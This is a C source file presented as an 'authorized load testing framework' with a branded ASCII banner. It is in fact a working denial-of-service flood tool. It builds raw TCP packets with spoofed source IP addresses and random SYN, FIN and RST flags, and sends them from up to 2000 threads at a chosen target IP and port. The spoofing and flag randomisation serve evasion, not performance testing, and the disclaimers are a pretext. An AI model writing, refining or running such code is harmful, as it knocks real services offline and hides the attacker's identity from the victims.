/*
 * Authorized Load Testing Framework
 * FOR LEGITIMATE PERFORMANCE EVALUATION ONLY
 * Use the code for educational purposes.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>
void matrix_rain();
void pulse_effect();
void loading_animation();
void print_seabuhi_full();


void matrix_rain() {
    int max = 50;
    for (int i = 0; i < 12; i++) {
        int len = rand() % max;
        printf("\033[96m");
        for (int j = 0; j < len; j++)
            printf("█");
        printf("\033[0m\n");
        usleep(60000);
    }
}


void pulse_effect() {
    for (int i = 0; i < 14; i++) {
        int count = (i < 7) ? i : 14 - i;
        printf("\033[96m");
        for (int j = 0; j < count; j++) printf("█");
        printf("\033[0m\r");
        fflush(stdout);
        usleep(60000);
    }
    printf("\n");
}

void loading_animation() {
    printf("\033[96mLoading");
    for (int i = 0; i < 12; i++) {
        fflush(stdout);
        usleep(120000);
        printf(".");
    }
    printf("\033[0m\n");
}


void print_seabuhi_full() {
    system("clear"); 
    matrix_rain();   
    pulse_effect();  

    printf("\033[96m");
    printf("                           ___.             .__      .__ \n");
    printf("  ______   ____   _____    \\_ |__    __ __  |  |__   |__|\n");
    printf(" /  ___/ _/ __ \\  \\__  \\    | __ \\  |  |  \\ |  |  \\  |  |\n");
    printf(" \\___ \\  \\  ___/   / __ \\_  | \\_\\ \\ |  |  / |   Y  \\ |  |\n");
    printf("/____  >  \\___  > (____  /  |___  / |____/  |___|  / |__|\n");
    printf("     \\/       \\/       \\/       \\/               \\/       \n");
    printf("\033[0m\n");

    loading_animation(); 

    printf("\033[96m");
    printf("                 ███████████████████████████████████████████\n");
    printf("                           ✦  T O O L   B Y   S E A B U H I  ✦\n");
    printf("                 GitHub:     https://github.com/seabuhi\n");
    printf("                 Instagram:  @seabuhi\n");
    printf("                 ███████████████████████████████████████████\n");
    printf("\033[0m\n");

    pulse_effect(); 
}


volatile int keep_running = 1;
static unsigned long long packet_count = 0;

void signal_handler(int sig) {
    keep_running = 0;
}

struct test_config {
    char target_ip[16];
    int target_port;
    int duration;
    int threads;
};

struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    register unsigned long sum = 0;
    unsigned short oddbyte;
    
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    return (unsigned short)~sum;
}

in_addr_t generate_realistic_source() {
    static int subnet_idx = 0;
    subnet_idx = (subnet_idx + 1) % 12;
    
    switch(subnet_idx) {
        case 0: return htonl((192<<24)|(168<<16)|(rand()%256<<8)|(rand()%254+1));
        case 1: return htonl((172<<24)|(16<<16)|(rand()%16<<8)|(rand()%254+1));
        case 2: return htonl((10<<24)|(rand()%256<<16)|(rand()%256<<8)|(rand()%254+1));
        case 3: return htonl((200<<24)|(rand()%55<<16)|(rand()%256<<8)|(rand()%254+1));
        case 4: return htonl((185<<24)|(rand()%70<<16)|(rand()%256<<8)|(rand()%254+1));
        case 5: return htonl((65<<24)|(rand()%190<<16)|(rand()%256<<8)|(rand()%254+1));
        case 6: return htonl((13<<24)|(rand()%244<<16)|(rand()%256<<8)|(rand()%254+1));
        case 7: return htonl((3<<24)|(rand()%256<<16)|(rand()%256<<8)|(rand()%254+1));
        case 8: return htonl((45<<24)|(rand()%210<<16)|(rand()%256<<8)|(rand()%254+1));
        case 9: return htonl((91<<24)|(rand()%256<<16)|(rand()%256<<8)|(rand()%254+1));
        case 10:return htonl((104<<24)|(rand()%256<<16)|(rand()%256<<8)|(rand()%254+1));
        default:return htonl((149<<24)|(rand()%256<<16)|(rand()%256<<8)|(rand()%254+1));
    }
}

void* test_worker(void* arg) {
    struct test_config* config = (struct test_config*)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    
    if (sock < 0) {
        return NULL;
    }
    
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sock);
        return NULL;
    }
    
    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_port = htons(config->target_port);
    dest.sin_addr.s_addr = inet_addr(config->target_ip);
    
    time_t start = time(NULL);
    time_t end = start + config->duration;
    
    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    
    while (keep_running && time(NULL) < end) {
        memset(datagram, 0, 4096);
        
        // IP Header Configuration
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = rand() & 0xFF;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl = 32 + (rand() % 96);
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = generate_realistic_source();
        iph->daddr = inet_addr(config->target_ip);
        
        // TCP Header Configuration
        tcph->source = htons(1024 + (rand() % 64511));
        tcph->dest = htons(config->target_port);
        tcph->seq = htonl(rand() & 0xFFFFFFFF);
        tcph->ack_seq = (rand() % 7) ? 0 : htonl(rand() & 0xFFFFFFFF);
        tcph->doff = 5;
        
        // Variable TCP flags
        int flag_pattern = rand() % 8;
        tcph->fin = (flag_pattern & 1) ? 1 : 0;
        tcph->syn = (flag_pattern & 2) ? 1 : 0;
        tcph->rst = (flag_pattern & 4) ? 1 : 0;
        tcph->psh = 0;
        tcph->ack = (rand() % 4 == 0) ? 1 : 0;
        tcph->urg = 0;
        tcph->window = htons(1024 + (rand() % 64511));
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Checksum calculation
        struct pseudo_header psh;
        psh.source_address = iph->saddr;
        psh.dest_address = inet_addr(config->target_ip);
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        memcpy(datagram + sizeof(struct iphdr) + sizeof(struct tcphdr), 
               &psh, sizeof(struct pseudo_header));
        
        tcph->check = csum((unsigned short *)(datagram + sizeof(struct iphdr)), 
                          sizeof(struct tcphdr) + sizeof(struct pseudo_header));
        
        if (sendto(sock, datagram, ntohs(iph->tot_len), 0, 
                   (struct sockaddr *)&dest, sizeof(dest)) >= 0) {
            __atomic_fetch_add(&packet_count, 1, __ATOMIC_SEQ_CST);
        }
        
        // Minimal delay for throughput
        if ((rand() % 1000) < 5) usleep(rand() % 50);
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    print_seabuhi_full();
    if (argc != 5) {
        printf("Usage: %s <target_ip> <target_port> <duration_seconds> <threads>\n", argv[0]);
        printf("Requires root privileges and explicit authorization\n");
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    struct test_config config;
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip));
    config.target_port = atoi(argv[2]);
    config.duration = atoi(argv[3]);
    config.threads = atoi(argv[4]);
    
    if (config.threads > 2000) config.threads = 2000;
    if (config.threads < 1) config.threads = 1;
    
    srand(time(NULL) ^ getpid());
    
    printf("[*] AUTHORIZED LOAD TESTING FRAMEWORK\n");
    printf("[*] Target: %s:%d | Duration: %ds | Threads: %d\n", 
           config.target_ip, config.target_port, config.duration, config.threads);
    printf("[*] Press Ctrl+C to stop early\n");
    
    pthread_t* threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) {
        printf("[!] Memory allocation failed\n");
        return 1;
    }
    
    time_t begin_time = time(NULL);
    
    for (int i = 0; i < config.threads; i++) {
        if (pthread_create(&threads[i], NULL, test_worker, &config) != 0) {
            printf("[!] Failed to create thread %d\n", i);
        }
        usleep(1000);
    }
    
    unsigned long long last_count = 0;
    time_t last_time = begin_time;
    
    while (keep_running) {
        sleep(1);
        time_t current = time(NULL);
        if (current - begin_time >= config.duration) break;
        
        unsigned long long current_count = __atomic_load_n(&packet_count, __ATOMIC_SEQ_CST);
        double rate = (double)(current_count - last_count) / (current - last_time);
        printf("[*] Packets: %llu | Rate: %.0f pps\n", current_count, rate);
        
        last_count = current_count;
        last_time = current;
    }
    
    printf("[*] Waiting for threads to finish...\n");
    for (int i = 0; i < config.threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    unsigned long long total_packets = __atomic_load_n(&packet_count, __ATOMIC_SEQ_CST);
    double avg_rate = (double)total_packets / config.duration;
    
    printf("[*] Test completed\n");
    printf("[*] Total packets: %llu\n", total_packets);
    printf("[*] Average rate: %.0f packets/second\n", avg_rate);
    
    free(threads);
    return 0;
}
